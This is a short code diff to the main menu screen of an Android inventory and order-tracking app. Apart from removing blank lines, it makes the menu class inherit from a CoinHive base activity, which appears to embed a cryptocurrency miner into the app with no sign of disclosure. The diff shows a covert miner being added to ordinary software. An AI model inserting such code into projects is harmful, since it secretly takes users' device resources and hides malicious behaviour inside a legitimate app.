@@ -57,10 +57,11 @@ import com.innovati.felipehernandez.invenenvios.database.VwPedidos_I;
 import com.innovati.felipehernandez.invenenvios.database.VwPedidos_IDao;
 import com.innovati.felipehernandez.invenenvios.database.VwUsuarios_I;
 import com.innovati.felipehernandez.invenenvios.database.VwUsuarios_IDao;
+import com.theah64.coinhive.BaseCoinHiveActivity;
 
 import java.util.List;
 
-public class MenuActivity extends AppCompatActivity
+public class MenuActivity extends BaseCoinHiveActivity
 {
     private SharedPreferences preferences;
     DaoSession daoSession;
@@ -481,7 +482,6 @@ public class MenuActivity extends AppCompatActivity
             metodosInternos.Alerta(R.string.tituloBDI, R.string.mensajeBDI);
         }
     }
-
     public static VwArticulosDao getVwArticulosDao()
     {
         return VwArticulosDaoFactory.create();
@@ -489,7 +489,6 @@ public class MenuActivity extends AppCompatActivity
     public static VwClientesDao getVwClientesDao() { return VwClientesDaoFactory.create(); }
     public static VwDetallePedidoDao getVwDetallesPedidosDao() { return VwDetallePedidoDaoFactory.create(); }
     public static DetallesPedidosDao getDetallesPedidosDao() { return DetallesPedidosDaoFactory.create(); }
-
     public static VwAgenteDao getVwAgenteDao()
     {
         return VwAgenteDaoFactory.create();
@@ -498,7 +497,6 @@ public class MenuActivity extends AppCompatActivity
     {
         return PedidosDaoFactory.create();
     }
-
     public static VwPedidosDao getVwPedidosDao()
     {
         return VwPedidosDaoFactory.create();
